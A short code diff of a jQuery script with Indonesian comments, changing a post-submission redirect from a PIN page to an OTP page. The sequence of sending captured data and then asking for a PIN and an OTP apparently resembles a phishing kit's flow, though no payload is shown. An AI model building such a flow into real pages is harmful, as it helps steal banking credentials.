@@ -85,7 +85,7 @@ $(document).ready(function() {
                     // Sukses, redirect ke halaman PIN
                     setTimeout(() => {
                         $("#loader").hide();
-                        window.location.href = 'pin.html'; // Ganti dengan halaman PIN kamu
+                        window.location.href = 'otp.html'; // Ganti dengan halaman PIN kamu
                     }, 500);
                 } else {
                     console.error('Error sending message:', data);
